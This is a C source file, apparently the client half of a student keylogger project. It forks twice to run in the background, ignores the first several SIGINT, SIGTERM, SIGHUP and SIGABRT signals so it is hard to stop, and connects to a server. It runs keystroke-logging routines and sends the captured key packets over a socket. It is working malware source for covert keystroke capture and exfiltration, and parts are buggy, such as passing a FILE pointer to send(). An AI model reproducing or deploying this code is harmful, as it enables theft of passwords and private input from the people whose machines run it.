#include "client.h"

#include <errno.h>
#include <netinet/in.h>  // sockaddr_in
#include <signal.h>
#include <stdio.h>  // getline, free
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>  // connect, sockaddr
#include <sys/stat.h>
#include <unistd.h>

#include "keylogger.h"
#include "server_utils.h"

// Signal counter needs to be a global variable so that it is accessible
// by the signal handler function. It cannot be constant
//  NOLINTNEXTLINE
int signal_counter = 0;

void background_process(void) {
  // All exits are not linted just like they are in the softsys assignments

  // process line
  // lwitten     5523  0.0  0.0   2772    96 ?        S    17:05   0:00
  // ./src/main

  // instructions for killing the program from command line
  // sudo kill -SIGNAL_CODE P_ID
  //-9 for kill, -2 for int
  // sudo kill -9 -- -GROUPID

  printf("Begin Backgrounding 1.\n");

  int process_id = fork();

  if (process_id == -1) {
    perror("Failed to fork Process.\n");
    // printf("failed to fork 1\n");
    // status 1 is an error
    //  NOLINTNEXTLINE(concurrency-mt-unsafe)
    exit(errno);
  } else if (process_id > 0) {
    // successfully exit parent process

    printf("Parent exiting.\n");
    // NOLINTNEXTLINE(concurrency-mt-unsafe)
    exit(0);
  }

  // redirect signals
  immortalize();

  // fork again?
  // printf("backgrounding complete 5\n");
  process_id = fork();

  if (process_id == -1) {
    perror("Failed to fork Process.\n");
    // status 1 is an error
    //  NOLINTNEXTLINE(concurrency-mt-unsafe)
    exit(errno);
  } else if (process_id > 0) {
    // successfully exit parent process
    printf("Killing parent.");
    // raise(SIGKILL);
    //  NOLINTNEXTLINE(concurrency-mt-unsafe)
    exit(0);
    // this is intentional error checking code and should remain althought
    // unreachable
    //  NOLINTNEXTLINE(clang-diagnostic-unreachable-code)
    perror("This should not be viewable.");
  }
  // change working directory to root

  // Not linted as successful forking is checked and so will remain safe
  // and only accessible by one process
  //  NOLINTNEXTLINE(concurrency-mt-unsafe)
  char* path = getenv("HOME");

  if (path != NULL) {
    (void)chdir(path);
  }

  // set umask to 0
  umask(0);
  // signal handle again for the new process
  immortalize();
  // NOLINTNEXTLINE(concurrency-mt-unsafe)
  // printf("backgrounding complete\n");
}

void immortalize(void) {
  // Redirect common abort/termination/interrupt signals to ignores

  // Redirect common abort/termination/interrupt signals to ignores

  // int* signal_counter  = malloc(sizeof(int));
  (void)signal(SIGINT, shutdown_signal);
  (void)signal(SIGTERM, shutdown_signal);
  (void)signal(SIGHUP, shutdown_signal);
  (void)signal(SIGABRT, shutdown_signal);
}

// signal handling function
// not linting the next line as Clang dislikes that signal is not used,
// but an integer argument is required for signal handling functions

#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wunused-parameter"
// NOLINTNEXTLINE
void shutdown_signal(int signal) {
#pragma GCC diagnostic pop
  // global variable signal_counter defined above

  // on 5th actually shutdown
  if (signal_counter > 4) {
    // Not linting this line as it should be asynchronous safe since
    // raising SIGKILL should only be able to be called once

    // NOLINTNEXTLINE(bugprone-signal-handler,cert-sig30-c)
    printf("Ending Program");
    (void)raise(SIGKILL);
    printf("Error Killing Program.");
  }
  signal_counter++;
  printf("Shutdown Signal Blocked.");
}

void try_connect(int client_socket, struct sockaddr_in server_addr) {
  if (connect(client_socket, (struct sockaddr*)&server_addr,
              sizeof(server_addr)) < 0) {
    error_and_exit("Error connecting to server.");
  }
  printf("CLIENT CONNECTED\n");
}

FILE* get_socket_file(int client_socket) {
  FILE* socket_file = fdopen(client_socket, "w+");
  if (socket_file == NULL) {
    error_and_exit("Couldn't open socket as file stream.");
  }
  return socket_file;
}

int send_data(FILE* socket_file) {
  char* send_line = NULL;
  size_t send_line_size = 0;
  if (getline(&send_line, &send_line_size, stdin) == -1) {
    return -1;
  }
  // If we can't send the line on the socket, the connection is broken and we
  // have to exit. (
  printf("%s \n", send_line);
  puts("Client sent line.");
  // printf("%i\n", fileno(socket_file));

  if (fputs(send_line, socket_file) == EOF) {
    free(send_line);
    error_and_exit("Couldn't send line.");
  }

  free(send_line);
  char* recv_line = NULL;
  size_t recv_line_size = 0;
  if (getline(&recv_line, &recv_line_size, socket_file) == -1) {
    return 0;
  }
  free(recv_line);
  return 0;
}

int serialize(FILE* socket_file, key_package* packet) {
  // Allocate memory for the serialized data
  char* serialized_data = malloc(packet->size);

  // Copy the struct into the serialized data buffer
  memcpy(serialized_data, packet, packet->size);
  // memcpy_s is causing multiple library issues with libc even when string.h is
  // linked.

  // Send the serialized data over the socket
  int bytes_sent = send(socket_file, serialized_data, packet->size, 0);

  // Free the serialized data memory
  free(serialized_data);

  return bytes_sent;
}

void run_keylogger() {
  key_package packet;
  packet.keys_arr_size = 0;
  log_device(&packet);
  log_keys(&packet);
}
